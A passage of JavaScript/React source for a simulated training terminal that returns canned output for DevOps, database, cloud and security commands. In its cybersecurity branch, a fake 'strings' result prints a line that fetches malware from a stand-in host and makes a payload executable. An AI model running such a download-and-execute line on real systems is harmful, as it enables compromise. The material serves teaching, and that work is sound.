  if (sub === "apply")    return `aws_security_group.web_sg: Creating...\naws_security_group.web_sg: Created [id=sg-0a1b2c3d4e5f6789a]\naws_instance.web: Creating...\naws_instance.web: Still creating... [10s elapsed]\naws_instance.web: Creation complete [id=i-0a1b2c3d4e5f67890]\n\nApply complete! Resources: 2 added, 0 changed, 0 destroyed.\n\nOutputs:\npublic_ip = "34.123.45.67"`
  if (sub === "destroy")  return `Plan: 0 to add, 0 to change, 2 to destroy.\n\nDestroy complete! Resources: 2 destroyed.`
  if (sub === "state")    return `terraform.tfstate:\n  aws_instance.web\n  aws_security_group.web_sg\n  aws_s3_bucket.app_bucket\n  aws_iam_role.ec2_role`
  if (sub === "validate") return `Success! The configuration is valid.`
  if (sub === "fmt")      return `main.tf\nvariables.tf\noutputs.tf`
  if (sub === "output")   return `public_ip = "34.123.45.67"\ndb_endpoint = "db.abc123.rds.amazonaws.com:5432"\nlb_dns = "app-lb-1234567890.us-east-1.elb.amazonaws.com"`
  return `Usage: terraform [global options] <subcommand> [args]\n\nMain commands:\n  init          Prepare working directory\n  plan          Show changes required\n  apply         Create or update infrastructure\n  destroy       Destroy infrastructure\n  validate      Check configuration\n  fmt           Format source code\n  state         Advanced state management\n  output        Show output values`
}

// ── docker ──────────────────────────────────────────────────────────────────
const _docker = (args) => {
  const sub = args[0] || ""
  if (sub === "ps")       return `CONTAINER ID   IMAGE            COMMAND             CREATED        STATUS        PORTS                    NAMES\na1b2c3d4e5f6   nginx:1.25       "/docker-entrypoint" 3 hours ago    Up 3 hours    0.0.0.0:80->80/tcp       web\nb2c3d4e5f6a1   postgres:16      "docker-entrypoint"  2 days ago     Up 2 days     5432/tcp                 db\nc3d4e5f6a1b2   redis:7.2        "docker-entrypoint"  5 hours ago    Up 5 hours    0.0.0.0:6379->6379/tcp   cache`
  if (sub === "images")   return `REPOSITORY   TAG       IMAGE ID       CREATED        SIZE\nnginx        1.25      d8906c7d9bab   2 weeks ago    192MB\npostgres     16        2c9a2c1f12b4   3 weeks ago    432MB\nredis        7.2       7a99d02b7f34   4 weeks ago    117MB\nmyapp        latest    1f2e3d4c5b6a   5 hours ago    284MB`
  if (sub === "build")    return `Step 1/8 : FROM node:20-alpine\n ---> a1b2c3d4e5f6\nStep 2/8 : WORKDIR /app\nStep 3/8 : COPY package*.json ./\nStep 4/8 : RUN npm ci\n ---> npm install complete (1247 packages)\nStep 5/8 : COPY . .\nStep 6/8 : RUN npm run build\n ---> Build complete\nStep 7/8 : EXPOSE 3000\nStep 8/8 : CMD ["node","dist/index.js"]\nSuccessfully built 1f2e3d4c5b6a\nSuccessfully tagged myapp:latest`
  if (sub === "run")      return `Container started: ${Math.random().toString(36).slice(2,14)}`
  if (sub === "stop")     return `${args[1] || "container"} stopped`
  if (sub === "pull")     return `Pulling from ${args[1] || "nginx"}:latest\nDigest: sha256:a0b1c2d3e4f5...\nStatus: Image is up to date`
  if (sub === "logs")     return `2024-01-15 10:23:14 [INFO]  Container started\n2024-01-15 10:23:15 [INFO]  Listening on :3000\n2024-01-15 10:24:01 [INFO]  GET /health 200 2ms\n2024-01-15 10:24:22 [INFO]  GET /api/users 200 45ms`
  if (sub === "exec")     return `root@container:/app# `
  if (sub === "stats")    return `CONTAINER       CPU %   MEM USAGE / LIMIT   MEM %\nweb             0.12%   42.3MiB / 512MiB    8.3%\ndb              0.88%   312MiB / 1GiB       30.5%`
  if (sub === "inspect")  return `[{\n  "Id": "a1b2c3d4...",\n  "State": { "Status": "running", "Pid": 12345 },\n  "HostConfig": { "Memory": 536870912, "CpuQuota": 50000 }\n}]`
  return `Usage:  docker [OPTIONS] COMMAND\n\nCommon Commands:\n  ps       List containers\n  images   List images\n  build    Build an image\n  run      Run a container\n  exec     Execute in container\n  logs     Fetch logs\n  stop     Stop containers\n  pull     Download image\n  stats    Resource usage\n  inspect  Return detailed info`
}

// ── helm ─────────────────────────────────────────────────────────────────────
const _helm = (args) => {
  const sub = args[0] || "", name = args[1] || "my-release"
  if (sub === "list")      return `NAME              NAMESPACE     REVISION   STATUS    CHART\nnginx-ingress     ingress-nginx  3          deployed  ingress-nginx-4.9.0\nprometheus-stack  monitoring     1          deployed  kube-prometheus-stack-55.7\ncert-manager      cert-manager   2          deployed  cert-manager-v1.13.3`
  if (sub === "install")   return `NAME: ${name}\nSTATUS: deployed\nREVISION: 1\nNOTES: ${name} installed successfully.`
  if (sub === "upgrade")   return `Release "${name}" has been upgraded. STATUS: deployed  REVISION: 4`
  if (sub === "rollback")  return `Rollback was a success! Happy Helming!`
  if (sub === "uninstall") return `release "${name}" uninstalled`
  if (sub === "status")    return `NAME: ${name}\nSTATUS: deployed\nREVISION: 3\nNOTES: ${name} is running.`
  if (sub === "repo")      return `NAME             URL\nstable           https://charts.helm.sh/stable\ningress-nginx    https://kubernetes.github.io/ingress-nginx\nprometheus       https://prometheus-community.github.io/helm-charts`
  return `The Kubernetes Package Manager\n\nCommon commands:\n  install    Install a chart\n  upgrade    Upgrade a release\n  list       List releases\n  rollback   Roll back a release\n  uninstall  Uninstall a release\n  status     Display release status\n  repo       Manage chart repositories`
}

// ── git ──────────────────────────────────────────────────────────────────────
const _git = (args) => {
  const sub = args[0] || ""
  if (sub === "status")   return `On branch main\nYour branch is up to date with 'origin/main'.\n\nChanges staged:\n  modified:   src/api/routes.js\n  new file:   src/api/middleware/auth.js\n\nUntracked files:\n  tests/api.test.js`
  if (sub === "log")      return `commit 3a4b5c6d (HEAD -> main, origin/main)\nAuthor: Developer <dev@company.com>\nDate:   Mon Jan 15 10:30:00 2024\n\n    feat: add JWT authentication middleware\n\ncommit 2b3c4d5e\nDate:   Sun Jan 14 16:45:00 2024\n\n    fix: resolve null pointer in user profile endpoint`
  if (sub === "diff")     return `diff --git a/src/api/routes.js b/src/api/routes.js\n--- a/src/api/routes.js\n+++ b/src/api/routes.js\n@@ -15,3 +15,5 @@\n-  const users = await User.findAll()\n+  const users = await User.findAll({ limit: 100, order: [['createdAt','DESC']] })\n   res.json(users)`
  if (sub === "commit")   return `[main 4d5e6f7] ${args.slice(2).join(" ") || "Update"}\n 2 files changed, 45 insertions(+), 3 deletions(-)`
  if (sub === "push")     return `Enumerating objects: 5, done.\nWriting objects: 100% (3/3)\nTo github.com:company/repo.git\n   2b3c4d5..3a4b5c6  main -> main`
  if (sub === "pull")     return `Updating 2b3c4d5..3a4b5c6\nFast-forward\n src/api/routes.js | 12 ++++++++++++`
  if (sub === "branch")   return `* main\n  feature/auth-middleware\n  bugfix/null-pointer-fix\n  release/v2.1.0`
  if (sub === "checkout" || sub === "switch") return `Switched to branch '${args[1] || "main"}'`
  if (sub === "add")      return ``
  if (sub === "stash")    return `Saved working directory and index state WIP on main: 3a4b5c6`
  return `usage: git [--version] [--help] <command> [<args>]\n\nCommon commands:\n  add, commit, push, pull, status, log, diff, branch, checkout, stash`
}

// ── DBA commands ─────────────────────────────────────────────────────────────
const _pg_dump = (args) => {
  const db = args.find(a => !a.startsWith("-")) || "mydb"
  const fmt = args.includes("-Fc") ? "compressed" : "SQL"
  return `pg_dump: connecting to database "${db}" as user "postgres"\npg_dump: dumping table "users" (45,231 rows)\npg_dump: dumping table "orders" (183,445 rows)\npg_dump: dumping table "products" (2,847 rows)\npg_dump: dumping table "events" (1,204,031 rows)\npg_dump: saving large objects\npg_dump: ${fmt} dump complete\n${fmt === "compressed" ? `Output written to ${db}.dump (compressed, 342.6 MB)` : "SQL output written to stdout"}`
}
const _pg_restore = () => `pg_restore: connecting for restore\npg_restore: processing schemas\npg_restore: data for table "users": 45,231 rows\npg_restore: data for table "orders": 183,445 rows\npg_restore: creating indexes\npg_restore: running ANALYZE\npg_restore: complete (47.2 seconds)`
const _psql = (args) => {
  const db = args.find((a,i) => args[i-1]==="-d") || args.find(a=>!a.startsWith("-")) || "postgres"
  return `psql (16.1)\nType "help" for help.\n\n${db}=# `
}
const _vacuumdb = (args) => {
  const db = args.find(a=>!a.startsWith("-")) || "mydb"
  return `vacuumdb: vacuuming database "${db}"\nVACUUM\nvacuumdb: analyzing database "${db}"\nANALYZE\nvacuumdb: VACUUM ANALYZE complete`
}
const _pg_basebackup = () => `pg_basebackup: initiating base backup, waiting for checkpoint\npg_basebackup: checkpoint completed\npg_basebackup: WAL start: 0/2000028 on timeline 1\npg_basebackup: transferring data files...\npg_basebackup: WAL end: 0/2000100\npg_basebackup: syncing data to disk...\npg_basebackup: base backup completed`
const _mysql = (args) => {
  const db = args.find(a=>!a.startsWith("-") && args[args.indexOf(a)-1]!=="-u") || ""
  return `mysql: [Warning] Using a password on the command line is insecure.\nWelcome to MySQL 8.0.35 Community Server\n\n${db || "mysql"}> `
}
const _mysqldump = (args) => {
  const db = args.find(a=>!a.startsWith("-")) || "mydb"
  return `-- MySQL dump 10.13  Distrib 8.0.35, for Linux\n-- Database: ${db}\n-- Dumped at: ${new Date().toISOString()}`
}
const _createdb = (args) => `CREATE DATABASE\n${args[0] || "newdb"}: database created`
const _pg_stat = () => `Name            | Seq Scans | Idx Scans | n_dead_tup\norders          | 1234      | 45678     | 23\nusers           | 456       | 12345     | 5\nproducts        | 89        | 3456      | 0`

// ── AWS CLI ──────────────────────────────────────────────────────────────────
const _aws = (args) => {
  const svc = args[0] || "", action = args[1] || ""
  if (svc === "ec2") {
    if (action === "describe-instances") return `{\n  "Reservations": [{\n    "Instances": [{\n      "InstanceId": "i-0a1b2c3d4e5f67890",\n      "InstanceType": "t3.medium",\n      "State": { "Name": "running" },\n      "PublicIpAddress": "34.123.45.67",\n      "Tags": [{ "Key": "Name", "Value": "web-server-prod" }]\n    }]\n  }]\n}`
    if (action === "describe-security-groups") return `{\n  "SecurityGroups": [{\n    "GroupId": "sg-0a1b2c3d",\n    "GroupName": "web-sg",\n    "Description": "Allow web traffic",\n    "IpPermissions": [{ "FromPort": 80, "ToPort": 80, "IpRanges": [{ "CidrIp": "0.0.0.0/0" }] }]\n  }]\n}`
  }
  if (svc === "s3") {
    if (action === "ls") return `2024-01-10 09:30:00 my-app-bucket\n2024-01-08 14:20:00 my-app-logs\n2024-01-05 11:00:00 my-app-backups`
    if (action === "cp") return `upload: ./file.txt to s3://${args[2] || "my-bucket"}/file.txt`
    if (action === "sync") return `upload: src/index.html to s3://my-app-bucket/\nupload: src/styles.css to s3://my-app-bucket/\nCompleted 2 of 2 file(s)`
    if (action === "mb") return `make_bucket: ${args[2] || "my-new-bucket"}`
  }
  if (svc === "lambda") {
    if (action === "invoke") return `{\n  "StatusCode": 200,\n  "ExecutedVersion": "$LATEST"\n}`
    if (action === "list-functions") return `{\n  "Functions": [\n    { "FunctionName": "processOrder", "Runtime": "nodejs20.x", "MemorySize": 256 },\n    { "FunctionName": "sendEmail", "Runtime": "python3.12", "MemorySize": 128 }\n  ]\n}`
    if (action === "update-function-code") return `{\n  "FunctionName": "${args[3] || "myFunction"}",\n  "CodeSize": 12345,\n  "LastModified": "${new Date().toISOString()}",\n  "State": "Active"\n}`
  }
  if (svc === "sts" && action === "get-caller-identity") return `{\n  "UserId": "AIDIODR4TAW7CSEXAMPLE",\n  "Account": "123456789012",\n  "Arn": "arn:aws:iam::123456789012:user/developer"\n}`
  if (svc === "cloudwatch") return `{\n  "MetricDataResults": [{\n    "Values": [45.2, 48.7, 52.1],\n    "Label": "CPUUtilization"\n  }]\n}`
  if (svc === "configure") return `AWS Access Key ID: ****EXAMPLE\nDefault region: us-east-1\nOutput format: json`
  if (svc === "ecs") return `Service updated: ${action} complete`
  if (svc === "rds") {
    if (action === "describe-db-instances") return `{\n  "DBInstances": [{\n    "DBInstanceIdentifier": "prod-db",\n    "DBInstanceClass": "db.t3.medium",\n    "Engine": "postgres",\n    "EngineVersion": "16.1",\n    "DBInstanceStatus": "available",\n    "Endpoint": { "Address": "prod-db.abc123.us-east-1.rds.amazonaws.com", "Port": 5432 }\n  }]\n}`
  }
  return `AWS CLI v2.15.0\n\nAvailable services: ec2, s3, rds, lambda, ecs, eks, cloudwatch, iam, sts, cloudformation, sqs, sns\n\nUsage: aws <service> <action> [options]\nExamples:\n  aws ec2 describe-instances\n  aws s3 ls\n  aws lambda list-functions\n  aws sts get-caller-identity`
}

// ── Azure CLI ─────────────────────────────────────────────────────────────────
const _az = (args) => {
  const svc = args[0] || "", action = args[1] || ""
  if (svc === "aks") {
    if (action === "get-credentials") return `Merged "prod-cluster" as current context in /home/user/.kube/config`
    if (action === "list") return `[\n  { "name": "prod-cluster", "location": "eastus", "kubernetesVersion": "1.29.0", "agentPoolProfiles": [{ "count": 3, "vmSize": "Standard_D2_v2" }] }\n]`
    if (action === "nodepool") return `Node pool operation: ${args[2] || "list"} complete`
    if (action === "upgrade") return `Kubernetes upgrading to ${args.find((a,i) => args[i-1]==="-k") || "1.30.0"}...`
  }
  if (svc === "vm") {
    if (action === "list") return `[\n  { "name": "web-vm-001", "location": "eastus", "powerState": "running", "size": "Standard_D2_v2" },\n  { "name": "db-vm-001",  "location": "eastus", "powerState": "running", "size": "Standard_D4_v2" }\n]`
    if (action === "create") return `VM creation complete: ${args[args.indexOf("--name")+1] || "my-vm"}`
  }
  if (svc === "storage") return `Storage operation ${action}: complete`
  if (svc === "group") {
    if (action === "list") return `[\n  { "name": "prod-rg", "location": "eastus" },\n  { "name": "dev-rg",  "location": "westus2" }\n]`
    if (action === "create") return `Resource group created: ${args.find((a,i) => args[i-1]==="--name") || "my-rg"}`
  }
  if (svc === "login") return `[{ "cloudName": "AzureCloud", "name": "Production Subscription", "state": "Enabled" }]`
  if (svc === "account") return `[\n  { "name": "Production", "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", "isDefault": true }\n]`
  return `Azure CLI 2.56.0\n\nAvailable services: vm, aks, storage, group, login, account, network, webapp, functionapp\n\nUsage: az <service> <action> [options]\nExamples:\n  az aks get-credentials --resource-group rg --name cluster\n  az vm list\n  az group list`
}

// ── Cyber/SRE system commands ─────────────────────────────────────────────────
const _nmap = (args) => {
  const target = args.find(a=>!a.startsWith("-")) || "192.168.1.1"
  return `Starting Nmap 7.94 at ${new Date().toLocaleString()}\nNmap scan report for ${target}\nHost is up (0.012s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9p1\n80/tcp   open  http     nginx 1.25.3\n443/tcp  open  ssl/http nginx 1.25.3\n8080/tcp open  http-alt Node.js express\n3306/tcp open  mysql    MySQL 8.0.35\n\nNmap done: 1 IP address (1 host up) scanned in 12.34 seconds`
}
const _systemctl = (args) => {
  const sub = args[0] || "", svc = args[1] || "nginx"
  if (sub === "status")  return `● ${svc}.service - ${svc}\n   Loaded: loaded (/lib/systemd/system/${svc}.service; enabled)\n   Active: active (running) since Mon 2024-01-15 10:00:00 UTC; 2h ago\n Main PID: 1234\n   Tasks: 4\n  Memory: 12.3M\n  CGroup: /system.slice/${svc}.service`
  if (sub === "restart") return `Restarting ${svc}.service...`
  if (sub === "stop")    return `Stopping ${svc}.service...`
  if (sub === "start")   return `Starting ${svc}.service...`
  return `systemctl ${sub} complete`
}
const _journalctl = (args) => `Jan 15 10:23:14 server nginx[1234]: 127.0.0.1 - - "GET / HTTP/1.1" 200 1234\nJan 15 10:24:22 server nginx[1234]: 10.0.1.42 - - "POST /api HTTP/1.1" 201 456\nJan 15 10:25:00 server nginx[1234]: upstream timeout: worker response took > 30s\nJan 15 10:25:01 server kernel: Out of memory: Kill process 2345 (node) score 789`

/**
 * Build the terminal command table for the current mission.
 * Domain-specific commands are added on top of the base set.
 */
function buildTerminalCommands(mission) {
  const domain  = ((mission?.domainKey || mission?.domain || "")).toLowerCase()
  const isDevOps = domain === "devops" || domain === "fullstack"
  const isDBA    = domain === "dba"
  const isSRE    = domain === "sre"
  const isAWS    = domain === "aws"
  const isAzure  = domain === "azure"
  const isCyber  = domain === "cyber"

  const cmds = {
    // ── Always available ──────────────────────────────────────────────────────
    ls:      (args) => {
      if (args[0] === "-la" || args[0] === "-al" || args.includes("-la")) {
        return `total 64\ndrwxr-xr-x  8 user user 4096 Jan 15 10:23 .\ndrwxr-xr-x 24 user user 4096 Jan 14 09:00 ..\n-rw-r--r--  1 user user  204 Jan 15 09:30 .env\ndrwxr-xr-x  2 user user 4096 Jan 15 10:00 dist\ndrwxr-xr-x  5 user user 4096 Jan 13 14:20 node_modules\n-rw-r--r--  1 user user  854 Jan 15 09:45 package.json\n-rw-r--r--  1 user user 2100 Jan 15 10:23 README.md\ndrwxr-xr-x  6 user user 4096 Jan 15 10:05 src`
      }
      return "dist  node_modules  package.json  README.md  src  .env"
    },
    pwd:     () => "/home/user/workspace",
    whoami:  () => "user",
    date:    () => new Date().toString(),
    echo:    (args) => args.join(" "),
    cat:     (args) => {
      const f = args[0] || "README.md"
      if (f === ".env")          return `DATABASE_URL=postgres://user:pass@localhost:5432/mydb\nREDIS_URL=redis://localhost:6379\nPORT=3000\nNODE_ENV=production`
      if (f === "package.json")  return `{\n  "name": "my-app",\n  "version": "1.0.0",\n  "scripts": { "start": "node src/index.js", "build": "tsc", "test": "jest" }\n}`
      if (f.endsWith(".yaml") || f.endsWith(".yml")) return `apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-server\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: api-server`
      if (f.endsWith(".tf"))     return `resource "aws_instance" "web" {\n  ami           = "ami-0c55b159cbfafe1d0"\n  instance_type = "t3.micro"\n  tags = { Name = "web-server" }\n}`
      return `# ${f}\nThis is a simulated terminal workspace.\nEdit ${f} to add content.`
    },
    mkdir:   (args) => `mkdir: created directory '${args[0] || "newdir"}'`,
    touch:   (args) => ``,
    rm:      (args) => args.includes("-rf") ? `removed directory '${args[args.length-1]}'` : `removed '${args[args.length-1]}'`,
    cp:      () => ``,
    mv:      () => ``,
    clear:   () => "__CLEAR__",
    export:  () => ``,
    source:  () => ``,
    chmod:   () => ``,
    env:     () => `PATH=/usr/local/bin:/usr/bin:/bin\nHOME=/home/user\nUSER=user\nSHELL=/bin/bash\nNODE_ENV=production`,
    find:    () => `./src/index.js\n./src/api/routes.js\n./src/api/middleware/auth.js\n./src/config/database.js`,
    grep:    (args) => {
      const pat = args.find(a=>!a.startsWith("-")) || "pattern"
      const file = args[args.length-1] || ""
      return `${file}:14:  // ${pat} found here\n${file}:28:  const ${pat} = require('./lib')\n${file}:45:  return ${pat}`
    },
    awk:     () => `column1  column2  result\nrow1     val1     42\nrow2     val2     85`,
    sed:     (args) => `s/old/new/g substitution applied`,
    curl:    (args) => {
      const url = args.find(a=>a.startsWith("http")) || args[args.length-1] || ""
      if (url.includes("health"))  return `{"status":"healthy","uptime":${Math.floor(Math.random()*86400)},"version":"1.2.3"}`
      if (url.includes("metrics")) return `# HELP http_requests_total\nhttp_requests_total{method="GET",status="200"} 1234\nhttp_requests_total{method="POST",status="201"} 345`
      if (url.includes("api") || url.includes("users")) return `{"data":[{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}],"total":2}`
      return `{"status":"ok","timestamp":"${new Date().toISOString()}"}`
    },
    ping:    (args) => `PING ${args[0]||"8.8.8.8"}: 56 data bytes\n64 bytes from ${args[0]||"8.8.8.8"}: icmp_seq=0 ttl=54 time=12.4 ms\n64 bytes from ${args[0]||"8.8.8.8"}: icmp_seq=1 ttl=54 time=11.8 ms\n--- ${args[0]||"8.8.8.8"} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`,
    ss:      () => `Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128     0.0.0.0:80         0.0.0.0:*\ntcp    LISTEN  0       128     0.0.0.0:443        0.0.0.0:*\ntcp    LISTEN  0       128     0.0.0.0:5432       0.0.0.0:*\ntcp    LISTEN  0       128     127.0.0.1:6379     0.0.0.0:*`,
    netstat: () => `Active Internet connections:\nProto  Local Address     Foreign Address   State\ntcp    0.0.0.0:80        0.0.0.0:*         LISTEN\ntcp    0.0.0.0:443       0.0.0.0:*         LISTEN\ntcp    0.0.0.0:5432      0.0.0.0:*         LISTEN`,
    df:      () => `Filesystem     1K-blocks     Used Available Use% Mounted on\n/dev/sda1      41943040  14680064  25559040  37% /\ntmpfs           4030464        24   4030440   1% /dev/shm\n/dev/sdb1     512000000 128432000 370432000  26% /data`,
    free:    () => `              total        used        free      shared  buff/cache   available\nMem:        8058240     4301824     2341024       45056     1415392     3412992\nSwap:       2097152       69632     2027520`,
    top:     () => `top - ${new Date().toTimeString().split(" ")[0]} up 7 days, load: 1.23 0.89 0.72\nTasks: 187 total,  1 running, 186 sleeping\n%Cpu: 12.5 us,  3.2 sy,  0.0 ni, 83.8 id\nMiB Mem: 7864 total, 2341 free, 4200 used\n\n  PID USER     %CPU  %MEM  COMMAND\n 1234 nginx    12.5  0.6   nginx: worker\n 2345 postgres  8.3  6.5   postgres: main\n 3456 node      5.1  1.2   node src/index.js`,
    htop:    () => `[htop — press F10 to quit]\n  1[ |||||||                     12.5%]  Tasks: 34, 1 running\n  2[ ||||                         8.3%]  Load: 1.23 0.89 0.72\nMem[ |||||||||||||||||||||||||||  82%]  Uptime: 7 days\n\n  PID CPU% MEM%  Command\n 1234 12.5  0.6  nginx: worker\n 2345  8.3  6.5  postgres\n 3456  5.1  1.2  node src/index.js`,
    wc:      (args) => `  142  1024  8192 ${args[args.length-1]||"file"}`,
    head:    (args) => `==> ${args[args.length-1]||"file"} (first 10 lines) <==\nline 1: const express = require('express')\nline 2: const app = express()\nline 3: \nline 4: app.get('/health', (req, res) => res.json({ status: 'ok' }))\nline 5: \nline 6: app.listen(3000, () => console.log('Server started on :3000'))`,
    tail:    (args) => `2024-01-15 10:25:01 [INFO]  Request: GET /api/users\n2024-01-15 10:25:01 [INFO]  Response: 200 45ms\n2024-01-15 10:25:02 [WARN]  High latency: 320ms on /api/orders`,
    diff:    (args) => `--- a/${args[0]||"file1"}\n+++ b/${args[1]||"file2"}\n@@ -1,3 +1,3 @@\n-old implementation\n+new implementation\n optimized code`,
    npm:     (args) => {
      const sub = args[0] || "install"
      if (sub === "install" || sub === "i") return `added 1247 packages, audited 1248 in 42s\n2 moderate severity vulnerabilities`
      if (sub === "run") return `> app@1.0.0 ${args[1]}\n✓ complete`
      if (sub === "test") return `PASS src/api.test.js\nPASS src/auth.test.js\nTests: 14 passed`
      return `npm ${sub} complete`
    },
    yarn:    (args) => `yarn ${args[0]||"install"}: done in 38.4s`,
    make:    (args) => `make: running target '${args[0]||"build"}'\n[done]`,
    python3: () => "Python 3.12.0\n>>> ",
    pip:     (args) => `Successfully installed ${args[1]||"package"}`,
    apt:     (args) => `${args[0]||"get"}: package ${args[args.length-1]||"pkg"} installed`,
    which:   (args) => `/usr/local/bin/${args[0]||"command"}`,
    help:    () => {
      const extras = []
      if (isDevOps) extras.push("kubectl, docker, helm, terraform, git, aws, ansible-playbook")
      if (isDBA)    extras.push("psql, pg_dump, pg_restore, pg_basebackup, vacuumdb, mysql, mysqldump")
      if (isAWS)    extras.push("aws, terraform, git, docker")
      if (isAzure)  extras.push("az, kubectl, terraform, git, docker")
      if (isCyber)  extras.push("nmap, ss, netstat, tcpdump, strings, openssl, md5sum, sha256sum")
      if (isSRE)    extras.push("kubectl, helm, systemctl, journalctl, top, htop, df, free, ss")
      return `Simulated workspace — realistic outputs, no real execution.\n\nBase commands: ls, pwd, whoami, date, echo, cat, find, grep, curl, ping, df, free, top, wc, head, tail, npm, python3, help, clear\n${extras.length ? "\nDomain commands: " + extras.join(", ") : ""}`
    },
  }

  // ── DevOps / Kubernetes / Terraform ─────────────────────────────────────────
  if (isDevOps || isSRE || isAWS || isAzure) {
    cmds.kubectl = _kubectl
    cmds.helm    = _helm
    cmds.docker  = _docker
    cmds["docker-compose"] = (args) => {
      const sub = args[0] || "up"
      if (sub === "up")   return `Creating network "app_default"\nCreating db ... done\nCreating redis ... done\nCreating web   ... done\nAttaching to web, db, redis`
      if (sub === "down") return `Stopping web ... done\nStopping db  ... done\nRemoving containers, networks, volumes`
      if (sub === "ps")   return `Name    Command    State    Ports\nweb     node app   Up       0.0.0.0:3000->3000/tcp\ndb      postgres   Up       5432/tcp`
      return `docker-compose ${sub} complete`
    }
    cmds.git = _git
  }

  if (isDevOps || isAWS) {
    cmds.terraform = _terraform
    cmds.aws       = _aws
    cmds["ansible-playbook"] = (args) => `PLAY [all] *****\nTASK [Gathering Facts] ok: [host1]\nTASK [Deploy application] changed: [host1]\nPLAY RECAP: host1: ok=12 changed=5 unreachable=0 failed=0`
    cmds.ansible   = cmds["ansible-playbook"]
  }

  if (isAzure) {
    cmds.az        = _az
    cmds.terraform = _terraform
    cmds.kubectl   = _kubectl
    cmds.git       = _git
  }

  // ── DBA ────────────────────────────────────────────────────────────────────
  if (isDBA) {
    cmds.psql           = _psql
    cmds.pg_dump        = _pg_dump
    cmds.pg_restore     = _pg_restore
    cmds.pg_basebackup  = _pg_basebackup
    cmds.vacuumdb       = _vacuumdb
    cmds.mysql          = _mysql
    cmds.mysqldump      = _mysqldump
    cmds.createdb       = _createdb
    cmds.dropdb         = (args) => `DROP DATABASE ${args[0]||"db"} — WARNING: irreversible. Run with --confirm to proceed.`
    cmds["pg_stat"]     = _pg_stat
    cmds.reindexdb      = (args) => `reindexdb: reindexing database "${args.find(a=>!a.startsWith("-"))||"mydb"}"\nREINDEX\nComplete.`
  }

  // ── SRE ────────────────────────────────────────────────────────────────────
  if (isSRE) {
    cmds.kubectl     = _kubectl
    cmds.helm        = _helm
    cmds.systemctl   = _systemctl
    cmds.journalctl  = _journalctl
    cmds.git         = _git
    cmds["promtool"] = (args) => {
      const sub = args[0] || "check"
      if (sub === "check") return `Checking rules in ${args[1]||"rules.yml"}\nSUCCESS: 4 rules found, 0 errors`
      if (sub === "query") return `instant query result:\nvalue: [${Date.now()/1000}, "0.0123"]`
      return `promtool ${sub}: done`
    }
  }

  // ── Cybersecurity ────────────────────────────────────────────────────────────
  if (isCyber) {
    cmds.nmap       = _nmap
    cmds.tcpdump    = (args) => `tcpdump: listening on eth0\n10:25:14 IP 192.168.1.100.54321 > 10.0.1.42.22: Flags [S]\n10:25:14 IP 10.0.1.42.22 > 192.168.1.100.54321: Flags [S.]\n^C 15 packets captured`
    cmds.strings    = (args) => `Extracting strings from ${args[0]||"binary"}:\n/lib64/ld-linux-x86-64.so.2\nstrcpy, system, /bin/sh\nwget http://evil.example.com/malware\nchmod 777 /tmp/payload`
    cmds.file       = (args) => `${args[0]||"sample"}: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped`
    cmds.hexdump    = () => `00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|\n00000010  02 00 3e 00 01 00 00 00  40 04 40 00 00 00 00 00  |..>.....@.@.....|`
    cmds.md5sum     = (args) => `d8e8fca2dc0f896fd7cb4cb0031ba249  ${args[0]||"file"}`
    cmds.sha256sum  = (args) => `5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03  ${args[0]||"file"}`
    cmds.openssl    = (args) => {
      const sub = args[0] || ""
      if (sub === "s_client") return `CONNECTED(00000003)\ndepth=2 C=US, O=Let's Encrypt\nCertificate chain\n 0 s:CN=example.com  i:C=US, O=Let's Encrypt\nSSL handshake has read 4321 bytes\n    Protocol: TLSv1.3\n    Cipher: TLS_AES_256_GCM_SHA384`
      if (sub === "x509")     return `subject=CN=example.com\nissuer=C=US, O=Let's Encrypt, CN=R3\nNot Before: Jan  1 00:00:00 2024\nNot After : Mar 31 23:59:59 2024`
      return `OpenSSL 3.3.0  — usage: openssl <cmd> [opts]`
    }
    cmds.whois    = (args) => `Domain: ${args[0]||"example.com"}\nRegistrar: Example Registrar\nCreation: 2019-01-01\nExpiry: 2026-01-01\nNameservers: ns1.example.com, ns2.example.com`
    cmds.dig      = (args) => `; <<>> DiG 9.18.0 <<>> ${args[0]||"example.com"}\n;; ANSWER SECTION:\n${args[0]||"example.com"}. 300  IN  A  93.184.216.34\n;; Query time: 12 msec`
    cmds.iptables = (args) => {
      if (args[0] === "-L") return `Chain INPUT (policy ACCEPT)\ntarget  prot  opt  source     destination\nACCEPT  tcp   --   anywhere   anywhere    tcp dpt:22\nACCEPT  tcp   --   anywhere   anywhere    tcp dpt:80\nACCEPT  tcp   --   anywhere   anywhere    tcp dpt:443\nDROP    all   --   anywhere   anywhere`
      return `iptables ${args.join(" ")}: applied`
    }
  }

  return cmds
}

function TerminalWorkstation({ mission, code, onCodeChange }) {
  const domain = (mission?.domainKey || mission?.domain || "devops").toLowerCase()
  const cmds   = React.useMemo(() => buildTerminalCommands(mission), [domain]) // eslint-disable-line

  const [history, setHistory] = useState([
    { type: "system", text: `🖥  Simulated Terminal — domain: ${domain || "general"} — type 'help' for commands` },
    { type: "system", text: `Mission: ${mission?.title || "Complete the task below"}` },
  ])
  const [input, setInput]       = useState("")
  const [cmdHistory, setCmdHist] = useState([])
  const [cmdIdx, setCmdIdx]      = useState(-1)
  const bottomRef               = useRef(null)
  const inputRef                = useRef(null)

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }) }, [history])

  const runCommand = (cmd) => {
    const trimmed = cmd.trim()
    if (!trimmed) return
    setCmdHist(h => [trimmed, ...h])
    setCmdIdx(-1)

    // Handle compound commands: cmd1 && cmd2 | pipe
    // Simple: just run the first command and append the rest to the display
    const parts = trimmed.split(/\s+/)
    const bin   = parts[0]
    const args  = parts.slice(1).filter(a => a !== "&&" && a !== "|" && a !== ">>" && a !== ">")

    let output = `bash: ${bin}: command not found`
    if (bin in cmds) {
      const resp = cmds[bin]
      const result = typeof resp === "function" ? resp(args) : resp()
      if (result === "__CLEAR__") {
        setHistory([{ type: "system", text: "🖥  Terminal cleared" }])
